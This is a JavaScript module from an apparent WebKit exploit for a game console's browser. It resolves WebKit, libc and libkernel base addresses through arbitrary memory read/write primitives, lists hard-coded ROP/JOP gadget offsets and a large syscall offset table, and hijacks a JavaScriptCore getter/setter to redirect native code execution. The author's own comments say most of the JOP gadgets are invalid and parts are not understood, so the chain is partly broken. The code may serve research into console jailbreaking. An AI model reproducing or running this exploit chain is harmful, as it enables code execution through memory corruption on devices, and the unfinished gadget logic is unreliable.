import { mem } from "../../module/mem.mjs";
import { KB } from "../../module/offset.mjs";
import { ChainBase, get_gadget } from "../../module/chain.mjs";
import { BufferView } from "../../module/rw.mjs";

import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";

import * as off from "../../module/offset.mjs";
import { hex } from "../../module/utils.mjs";

const offset_wk_memset_import = 0x028DDEB8;
const offset_wk_stack_chk_guard_import = 0x028DDB98;

const offset_lk_stack_chk_guard = 0x00069190;
const offset_lc_memset = 0x00014B50;

export const gadgets = new Map();

// libSceNKWebKit.sprx
export let libwebkit_base = null;
// libkernel_web.sprx
export let libkernel_base = null;
// libSceLibcInternal.sprx
export let libc_base = null;

// gadgets for the JOP chain
//
// When the scrollLeft getter native function is called on the console, rsi is
// the JS wrapper for the WebCore textarea class.
const jop1 = `
mov rdi, qword ptr [rsi + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0xb8]
`;
// Since the method of code redirection we used is via redirecting a call to
// jump to our JOP chain, we have the return address of the caller on entry.
//
// jop1 pushed another object (via the call instruction) but we want no
// extra objects between the return address and the rbp that will be pushed by
// jop2 later. So we pop the return address pushed by jop1.
//
// This will make pivoting back easy, just "leave; ret".
const jop2 = `
pop rsi
jmp qword ptr [rax + 0x1c]
`;
const jop3 = `
mov rdi, qword ptr [rax + 8]
mov rax, qword ptr [rdi]
jmp qword ptr [rax + 0x30]
`;
// rbp is now pushed, any extra objects pushed by the call instructions can be
// ignored
const jop4 = `
push rbp
mov rbp, rsp
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x58]
`;
const jop5 = `
mov rdx, qword ptr [rax + 0x18]
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x10]
`;
const jop6 = `
push rdx
jmp qword ptr [rax]
`;
const jop7 = "pop rsp; ret";

let syscall_map = {
  1: 0x33b80, // sys_exit
  2: 0x34b30, // sys_fork
  3: 0x32d50, // sys_read
  4: 0x32cb0, // sys_write
  5: 0x33350, // sys_open
  6: 0x33980, // sys_close
  7: 0x32570, // sys_wait4
  10: 0x34670, // sys_unlink
  12: 0x34000, // sys_chdir
  15: 0x33a00, // sys_chmod
  20: 0x32ed0, // sys_getpid
  23: 0x329d0, // sys_setuid
  24: 0x33fe0, // sys_getuid
  25: 0x33390, // sys_geteuid
  27: 0x33430, // sys_recvmsg
  28: 0x33660, // sys_sendmsg
  29: 0x341b0, // sys_recvfrom
  30: 0x328d0, // sys_accept
  31: 0x326f0, // sys_getpeername
  32: 0x34810, // sys_getsockname
  33: 0x34330, // sys_access
  34: 0x344b0, // sys_chflags
  35: 0x33e80, // sys_fchflags
  36: 0x34d60, // sys_sync
  37: 0x33330, // sys_kill
  39: 0x32dd0, // sys_getppid
  41: 0x34390, // sys_dup
  42: 0x32d20, // sys_pipe
  43: 0x349d0, // sys_getegid
  44: 0x34d20, // sys_profil
  47: 0x32870, // sys_getgid
  49: 0x32850, // sys_getlogin
  50: 0x340e0, // sys_setlogin
  53: 0x32a90, // sys_sigaltstack
  54: 0x32bf0, // sys_ioctl
  55: 0x33ec0, // sys_reboot
  56: 0x33dc0, // sys_revoke
  59: 0x340c0, // sys_execve
  65: 0x33a60, // sys_msync
  73: 0x33250, // sys_munmap
  74: 0x33fc0, // sys_mprotect
  75: 0x33140, // sys_madvise
  78: 0x33310, // sys_mincore
  79: 0x327d0, // sys_getgroups
  80: 0x32d70, // sys_setgroups
  83: 0x327b0, // sys_setitimer
  86: 0x325d0, // sys_getitimer
  89: 0x33e20, // sys_getdtablesize
  90: 0x34230, // sys_dup2
  92: 0x33860, // sys_fcntl
  93: 0x333b0, // sys_select
  95: 0x32810, // sys_fsync
  96: 0x33740, // sys_setpriority
  97: 0x32f90, // sys_socket
  98: 0x34020, // sys_connect
  99: 0x34990, // sys_netcontrol
  100: 0x32590, // sys_getpriority
  101: 0x345b0, // sys_netabort
  102: 0x34930, // sys_netgetsockinfo
  104: 0x34630, // sys_bind
  105: 0x338a0, // sys_setsockopt
  106: 0x32b90, // sys_listen
  113: 0x33ba0, // sys_socketex
  114: 0x33570, // sys_socketclose
  116: 0x34d40, // sys_gettimeofday
  117: 0x34e20, // sys_getrusage
  118: 0x32550, // sys_getsockopt
  120: 0x337e0, // sys_readv
  121: 0x33640, // sys_writev
  122: 0x34290, // sys_settimeofday
  124: 0x331d0, // sys_fchmod
  125: 0x33a40, // sys_netgetiflist
  126: 0x34910, // sys_setreuid
  127: 0x33530, // sys_setregid
  128: 0x34490, // sys_rename
  131: 0x334b0, // sys_flock
  133: 0x34d80, // sys_sendto
  134: 0x34bb0, // sys_shutdown
  135: 0x33f40, // sys_socketpair
  136: 0x33ce0, // sys_mkdir
  137: 0x32f30, // sys_rmdir
  138: 0x32440, // sys_utimes
  140: 0x348d0, // sys_adjtime
  141: 0x33a20, // sys_kqueueex
  147: 0x33c80, // sys_setsid
  165: 0x32770, // sys_sysarch
  182: 0x34710, // sys_setegid
  183: 0x325b0, // sys_seteuid
  188: 0x34770, // sys_stat
  189: 0x34b70, // sys_fstat
  190: 0x33550, // sys_lstat
  191: 0x32c50, // sys_pathconf
  192: 0x33f00, // sys_fpathconf
  194: 0x33490, // sys_getrlimit
  195: 0x33070, // sys_setrlimit
  196: 0x34690, // sys_getdirentries
  202: 0x34470, // sys___sysctl
  203: 0x33b20, // sys_mlock
  204: 0x34510, // sys_munlock
  206: 0x32fd0, // sys_futimes
  209: 0x335b0, // sys_poll
  232: 0x32670, // sys_clock_gettime
  233: 0x33ae0, // sys_clock_settime
  234: 0x34ae0, // sys_clock_getres
  235: 0x346b0, // sys_ktimer_create
  236: 0x32e30, // sys_ktimer_delete
  237: 0x34b90, // sys_ktimer_settime
  238: 0x34040, // sys_ktimer_gettime
  239: 0x331f0, // sys_ktimer_getoverrun
  240: 0x34570, // sys_nanosleep
  241: 0x33da0, // sys_ffclock_getcounter
  242: 0x32d90, // sys_ffclock_setestimate
  243: 0x33c20, // sys_ffclock_getestimate
  247: 0x34610, // sys_clock_getcpuclockid2
  253: 0x341d0, // sys_issetugid
  272: 0x34970, // sys_getdents
  289: 0x34080, // sys_preadv
  290: 0x335d0, // sys_pwritev
  310: 0x332d0, // sys_getsid
  315: 0x34790, // sys_aio_suspend
  324: 0x32e50, // sys_mlockall
  325: 0x34250, // sys_munlockall
  327: 0x32f50, // sys_sched_setparam
  328: 0x33bc0, // sys_sched_getparam
  329: 0x32710, // sys_sched_setscheduler
  330: 0x33590, // sys_sched_getscheduler
  331: 0x333f0, // sys_sched_yield
  332: 0x32990, // sys_sched_get_priority_max
  333: 0x32ab0, // sys_sched_get_priority_min
  334: 0x32ce0, // sys_sched_rr_get_interval
  340: 0x324a0, // sys_sigprocmask
  341: 0x324e0, // sys_sigsuspend
  343: 0x343b0, // sys_sigpending
  345: 0x344d0, // sys_sigtimedwait
  346: 0x34110, // sys_sigwaitinfo
  362: 0x346f0, // sys_kqueue
  363: 0x32950, // sys_kevent
  379: 0x328f0, // sys_mtypeprotect
  392: 0x32a10, // sys_uuidgen
  393: 0x34e60, // sys_sendfile
  397: 0x32eb0, // sys_fstatfs
  400: 0x32a70, // sys_ksem_close
  401: 0x33800, // sys_ksem_post
  402: 0x340a0, // sys_ksem_wait
  403: 0x34e40, // sys_ksem_trywait
  404: 0x32bb0, // sys_ksem_init
  405: 0x345d0, // sys_ksem_open
  406: 0x342b0, // sys_ksem_unlink
  407: 0x32a30, // sys_ksem_getvalue
  408: 0x34270, // sys_ksem_destroy
  416: 0x34750, // sys_sigaction
  417: 0x343f0, // sys_sigreturn
  421: 0x330d0, // sys_getcontext
  422: 0x33e00, // sys_setcontext
  423: 0x33f20, // sys_swapcontext
  429: 0x33120, // sys_sigwait
  430: 0x327f0, // sys_thr_create
  431: 0x32b50, // sys_thr_exit
  432: 0x334f0, // sys_thr_self
  433: 0x32b70, // sys_thr_kill
  441: 0x34190, // sys_ksem_timedwait
  442: 0x324c0, // sys_thr_suspend
  443: 0x32df0, // sys_thr_wake
  444: 0x33e60, // sys_kldunloadf
  454: 0x34b50, // sys__umtx_op
  455: 0x34890, // sys_thr_new
  456: 0x347f0, // sys_sigqueue
  464: 0x34150, // sys_thr_set_name
  466: 0x33700, // sys_rtprio_thread
  475: 0x32e90, // sys_pread
  476: 0x33fa0, // sys_pwrite
  477: 0x34870, // sys_mmap
  478: 0x34370, // sys_lseek
  479: 0x33410, // sys_truncate
  480: 0x32e70, // sys_ftruncate
  481: 0x32460, // sys_thr_kill2
  482: 0x34de0, // sys_shm_open
  483: 0x34850, // sys_shm_unlink
  486: 0x33090, // sys_cpuset_getid
  487: 0x34c50, // sys_cpuset_getaffinity
  488: 0x34410, // sys_cpuset_setaffinity
  499: 0x32830, // sys_openat
  515: 0x33ee0, // sys___cap_rights_get
  522: 0x33920, // sys_pselect
  532: 0x339e0, // sys_regmgr_call
  533: 0x33760, // sys_jitshm_create
  534: 0x33d40, // sys_jitshm_alias
  535: 0x32c30, // sys_dl_get_list
  536: 0x33a80, // sys_dl_get_info
  538: 0x339c0, // sys_evf_create
  539: 0x32e10, // sys_evf_delete
  540: 0x33d60, // sys_evf_open
  541: 0x33940, // sys_evf_close
  542: 0x33c00, // sys_evf_wait
  543: 0x343d0, // sys_evf_trywait
  544: 0x33d80, // sys_evf_set
  545: 0x342f0, // sys_evf_clear
  546: 0x33100, // sys_evf_cancel
  547: 0x33be0, // sys_query_memory_protection
  548: 0x334d0, // sys_batch_map
  549: 0x336e0, // sys_osem_create
  550: 0x326b0, // sys_osem_delete
  551: 0x32630, // sys_osem_open
  552: 0x34c30, // sys_osem_close
  553: 0x33cc0, // sys_osem_wait
  554: 0x342d0, // sys_osem_trywait
  555: 0x33f60, // sys_osem_post
  556: 0x33840, // sys_osem_cancel
  557: 0x335f0, // sys_namedobj_create
  558: 0x332f0, // sys_namedobj_delete
  559: 0x34ec0, // sys_set_vm_container
  560: 0x32db0, // sys_debug_init
  563: 0x33720, // sys_opmc_enable
  564: 0x32790, // sys_opmc_disable
  565: 0x337a0, // sys_opmc_set_ctl
  566: 0x337c0, // sys_opmc_set_ctr
  567: 0x34210, // sys_opmc_get_ctr
  572: 0x33030, // sys_virtual_query
  585: 0x34650, // sys_is_in_sandbox
  586: 0x33210, // sys_dmem_container
  587: 0x33ac0, // sys_get_authinfo
  588: 0x32610, // sys_mname
  591: 0x32c10, // sys_dynlib_dlsym
  592: 0x32f10, // sys_dynlib_get_list
  593: 0x349b0, // sys_dynlib_get_info
  594: 0x338c0, // sys_dynlib_load_prx
  595: 0x328b0, // sys_dynlib_unload_prx
  596: 0x34730, // sys_dynlib_do_copy_relocations
  598: 0x336c0, // sys_dynlib_get_proc_param
  599: 0x34a10, // sys_dynlib_process_needed_and_relocate
  600: 0x32480, // sys_sandbox_path
  601: 0x32ff0, // sys_mdbg_service
  602: 0x33680, // sys_randomized_path
  603: 0x344f0, // sys_rdup
  604: 0x32af0, // sys_dl_get_metadata
  605: 0x33230, // sys_workaround8849
  606: 0x329f0, // sys_is_development_mode
  607: 0x33b60, // sys_get_self_auth_info
  608: 0x34e00, // sys_dynlib_get_info_ex
  610: 0x34ea0, // sys_budget_get_ptype
  611: 0x32d00, // sys_get_paging_stats_of_all_threads
  612: 0x34c10, // sys_get_proc_type_info
  613: 0x32420, // sys_get_resident_count
  615: 0x33780, // sys_get_resident_fmem_count
  616: 0x34830, // sys_thr_get_name
  617: 0x33e40, // sys_set_gpo
  618: 0x33b40, // sys_get_paging_stats_of_all_objects
  619: 0x32930, // sys_test_debug_rwmem
  620: 0x32a50, // sys_free_stack
  622: 0x32650, // sys_ipmimgr_call
  623: 0x33aa0, // sys_get_gpo
  624: 0x34e80, // sys_get_vm_map_timestamp
  625: 0x34430, // sys_opmc_set_hw
  626: 0x32f70, // sys_opmc_get_hw
  627: 0x325f0, // sys_get_cpu_usage_all
  628: 0x33c60, // sys_mmap_dmem
  629: 0x33010, // sys_physhm_open
  630: 0x33820, // sys_physhm_unlink
  632: 0x34dc0, // sys_thr_suspend_ucontext
  633: 0x332b0, // sys_thr_resume_ucontext
  634: 0x33270, // sys_thr_get_ucontext
  635: 0x33370, // sys_thr_set_ucontext
  636: 0x32fb0, // sys_set_timezone_info
  637: 0x33d00, // sys_set_phys_fmem_limit
  638: 0x330b0, // sys_utc_to_localtime
  639: 0x34ee0, // sys_localtime_to_utc
  640: 0x34060, // sys_set_uevt
  641: 0x32bd0, // sys_get_cpu_usage_proc
  642: 0x33450, // sys_get_map_statistics
  643: 0x341f0, // sys_set_chicken_switches
  646: 0x34b10, // sys_get_kernel_mem_statistics
  647: 0x33d20, // sys_get_sdk_compiled_version
  648: 0x32690, // sys_app_state_change
  649: 0x348b0, // sys_dynlib_get_obj_member
  652: 0x32730, // sys_process_terminate
  653: 0x32ef0, // sys_blockpool_open
  654: 0x32c90, // sys_blockpool_map
  655: 0x346d0, // sys_blockpool_unmap
  656: 0x34310, // sys_dynlib_get_info_for_libdbg
  657: 0x333d0, // sys_blockpool_batch
  658: 0x32b30, // sys_fdatasync
  659: 0x33050, // sys_dynlib_get_list2
  660: 0x34da0, // sys_dynlib_get_info2
  661: 0x34550, // sys_aio_submit
  662: 0x32ad0, // sys_aio_multi_delete
  663: 0x33900, // sys_aio_multi_wait
  664: 0x329b0, // sys_aio_multi_poll
  665: 0x34450, // sys_aio_get_data
  666: 0x338e0, // sys_aio_multi_cancel
  667: 0x32890, // sys_get_bio_usage_all
  668: 0x33f80, // sys_aio_create
  669: 0x349f0, // sys_aio_submit_cmd
  670: 0x348f0, // sys_aio_init
  671: 0x34350, // sys_get_page_table_stats
  672: 0x347b0, // sys_dynlib_get_list_for_libdbg
  673: 0x34950, // sys_blockpool_move
  674: 0x347d0, // sys_virtual_query_all
  675: 0x33880, // sys_reserve_2mb_page
  676: 0x34130, // sys_cpumode_yield
  677: 0x33c40, // sys_wait6
  678: 0x336a0, // sys_cap_rights_limit
  679: 0x32c70, // sys_cap_ioctls_limit
  680: 0x339a0, // sys_cap_ioctls_get
  681: 0x34170, // sys_cap_fcntls_limit
  682: 0x32910, // sys_cap_fcntls_get
  683: 0x34c70, // sys_bindat
  684: 0x33470, // sys_connectat
  685: 0x326d0, // sys_chflagsat
  686: 0x32520, // sys_accept4
  687: 0x32b10, // sys_pipe2
  688: 0x33510, // sys_aio_mlock
  689: 0x34bf0, // sys_procctl
  690: 0x33ea0, // sys_ppoll
  691: 0x33de0, // sys_futimens
  692: 0x34590, // sys_utimensat
  693: 0x33b00, // sys_numa_getaffinity
  694: 0x33960, // sys_numa_setaffinity
  705: 0x32970, // sys_get_phys_page_size
  713: 0x34bd0, // sys_get_ppr_sdk_compiled_version
  716: 0x331b0, // sys_openintr
  717: 0x33ca0, // sys_dl_get_info_2
  718: 0x33290, // sys_acinfo_add
  719: 0x32500, // sys_acinfo_delete
  720: 0x34530, // sys_acinfo_get_all_for_coredump
  721: 0x345f0, // sys_ampr_ctrl_debug
  722: 0x32750, // sys_workspace_ctrl
}

let webkit_gadget_offsets = new Map(
  Object.entries({
    "pop rax; ret": 0x000000000002c827, // `58 c3`
    "pop rbx; ret": 0x0000000000008631, // `5b c3`
    "pop rcx; ret": 0x000000000009ac92, // `59 c3`
    "pop rdx; ret": 0x00000000002ffdf2, // `5a c3`

    "pop rbp; ret": 0x00000000000000c6, // `5d c3`
    "pop rsi; ret": 0x0000000000115923, // `5e c3`
    "pop rdi; ret": 0x0000000000107342, // `5f c3`
    "pop rsp; ret": 0x0000000000099a22, // `5c c3`

    "pop r8; ret": 0x000000000024a59f, // `47 58 c3`
    "pop r9; ret": 0x0000000000277b41, // `47 59 c3`
    "pop r10; ret": 0x00000000002ffdf1, // `47 5a c3`
    "pop r11; ret": 0x0000000000b85e99, // `47 5b c3`

    "pop r12; ret": 0x0000000000099a21, // `47 5c c3`
    "pop r13; ret": 0x00000000006181a2, // `47 5d c3`
    "pop r14; ret": 0x00000000001a2cd6, // `47 5e c3`
    "pop r15; ret": 0x0000000000107341, // `47 5f c3`

    "ret": 0x0000000000000042, // `c3`
    "leave; ret": 0x000000000009ecb3, // `c9 c3`

    "mov rax, qword ptr [rax]; ret": 0x0000000000047fec, // `48 8b 00 c3`
    "mov qword ptr [rdi], rax; ret": 0x000000000003a79a, // `48 89 07 c3`
    "mov dword ptr [rdi], eax; ret": 0x000000000003469f, // `89 07 c3`
    // not present in webkit, libc, and libkernel
    // "mov dword ptr [rax], esi; ret": 0x000000000109b1f0, // `89 30 c3`


    // TODO: none of the JOPs except the last one are valid. Need to learn and find these, potentially rewrite.  
    [jop1]: 0x00000000004e62a4, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
    [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
    [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`

    [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
    [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
    [jop6]: 0x00000000028bd332, // `52 ff 20`
    [jop7]: 0x0000000000099a22, // `5c c3`
  }),
);

const libc_gadget_offsets = new Map(
  Object.entries({
    // This isn't a ROP gadget, but a JOP gadget which jmp to pop registers and return. Doesn't work either
    // "mov dword ptr [rax], esi; ret": 0x000000000008b498,
    "getcontext": 0x443F4,
    "setcontext": 0x44378,
  }),
);

const libkernel_gadget_offsets = new Map(
  Object.entries({
    // This isn't a ROP gadget, but a JOP gadget which jmp to pop registers and return. Doesn't work either
    // "mov dword ptr [rax], esi; ret": 0x000000000000dda2,
    // returns the location of errno
    "__error": 0x1CF70,
  }),
);


function get_bases() {
  const textarea = document.createElement("textarea");
  const webcore_textarea = mem.addrof(textarea).readp(off.jsta_impl);
  const textarea_vtable = webcore_textarea.readp(0);
  const off_ta_vt = 0x02762860;
  const libwebkit_base = textarea_vtable.sub(off_ta_vt);

  const stack_chk_guard_import = libwebkit_base.add(offset_wk_stack_chk_guard_import);
  const stack_chk_guard_addr = stack_chk_guard_import.readp(0);
  const libkernel_base = stack_chk_guard_addr.sub(offset_lk_stack_chk_guard);

  const memset_import = libwebkit_base.add(offset_wk_memset_import);
  const memset_addr = memset_import.readp(0);
  const libc_base = memset_addr.sub(offset_lc_memset);

  return [libwebkit_base, libkernel_base, libc_base];
}

function crash(addr) {
  let x = 0x32;
  while (true) {
    addr.readp(x);
    x += x;
  }
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
  for (const [insn, offset] of offset_map) {
    gadget_map.set(insn, base_addr.add(offset));
  }
}

export function init_syscalls(syscall_array, libkernel_web_base, syscall_map) {
  for (let sysc in syscall_map) {
    syscall_array[sysc] = libkernel_web_base.add(syscall_map[sysc]);
  }
}


class Chain320Base extends ChainBase {
  push_end() {
    this.push_gadget("leave; ret");
  }

  push_get_retval() {
    this.push_gadget("pop rdi; ret");
    this.push_value(this.retval_addr);
    this.push_gadget("mov qword ptr [rdi], rax; ret");
  }

  push_get_errno() {
    this.push_gadget("pop rdi; ret");
    this.push_value(this.errno_addr);

    this.push_call(this.get_gadget("__error"));

    this.push_gadget("mov rax, qword ptr [rax]; ret");
    this.push_gadget("mov dword ptr [rdi], eax; ret");
  }

  push_clear_errno() {
    this.push_call(this.get_gadget("__error"));
    this.push_gadget("pop rsi; ret");
    this.push_value(0);
    // TODO: most things will return 0 because of this missing gadget.
    this.push_gadget("mov dword ptr [rax], esi; ret");
  }
}

export class Chain320 extends Chain320Base {
  constructor() {
    super(0x2000);
    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
    rdx.write64(off.js_cell, this._empty_cell);
    rdx.write64(0x50, this.stack_addr);
    this._rsp = mem.fakeobj(rdx);
  }

  run() {
    this.check_allow_run();
    this._rop.launch = this._rsp;
    this.dirty();
  }
}

export const Chain = Chain320;

export function init(Chain) {
  const syscall_array = [];
  [libwebkit_base, libkernel_base, libc_base] = get_bases();

  init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
  init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
  init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
  init_syscalls(syscall_array, libkernel_base, syscall_map);

  // NOTE: all of gs is vodoo to me.
  let gs = Object.getOwnPropertyDescriptor(window, "location").set;
  // JSCustomGetterSetter.m_getterSetter | readp(offset = 0x28) returns 0x1, which causes page fault. No idea what should be the correct value.
  gs = mem.addrof(gs).readp(0x18);
  // 0x18 "works", idk what the implications for this is yet, but time to find out.

  // sizeof JSC::CustomGetterSetter
  const size_cgs = 0x18;
  const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
  mem.cpy(gc_buf, gs, size_cgs);
  // JSC::CustomGetterSetter.m_setter
  // gc_buf.write64(0x10, get_gadget(gadgets, jop1));

  const proto = Chain.prototype;
  // _rop must have a descriptor initially in order for the structure to pass
  // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
  // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
  // checks for any descriptor to run
  //
  // the butterfly's indexing type must be something the GC won't inspect
  // like DoubleShape. it will be used to store the JOP table's pointer
  const _rop = {
    get launch() {
      throw Error("never call");
    },
    0: 1.1,
  }
  // replace .launch with the actual custom getter/setter
  mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
  proto._rop = _rop;

  // JOP table
  const rax_ptrs = new BufferView(0x100);
  const rax_ptrs_p = get_view_vector(rax_ptrs);
  proto._rax_ptrs = rax_ptrs;

  // rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
  // rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
  // rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
  // rax_ptrs.write64(0, get_gadget(gadgets, jop5));

  const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
  jop_buffer_p.write64(0, rax_ptrs_p);

  const empty = {};
  proto._empty_cell = mem.addrof(empty).read64(off.js_cell);

  Chain.init_class(gadgets, syscall_array);
}
